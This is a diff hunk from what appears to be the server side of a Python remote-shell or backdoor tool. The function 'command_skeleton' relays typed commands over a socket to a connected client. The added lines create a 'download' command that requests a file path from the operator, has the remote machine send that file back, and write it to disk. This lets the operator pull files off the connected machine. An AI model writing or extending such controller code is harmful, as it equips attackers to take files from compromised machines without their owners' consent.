@@ -78,6 +78,16 @@ def command_skeleton(conn):
 				s.close()
 				#sys.exit()
 				main()
+			if cmd == 'download':
+				conn.send(cmd.encode())
+				path = input("[i] File to download (include extentsion): ")
+				conn.send(path.encode())
+				file = conn.recv(10000000)
+				new_name = input("[i] Download file as (include extension): ")
+				new_file = open(new_name, "wb")
+				new_file.write(file)
+				new_file.close()
+				print("[i] " + new_name + " has been saved")
 			else:
 				conn.send(str.encode(cmd))
 				client_response = str(conn.recv(BYTES), "utf-8")
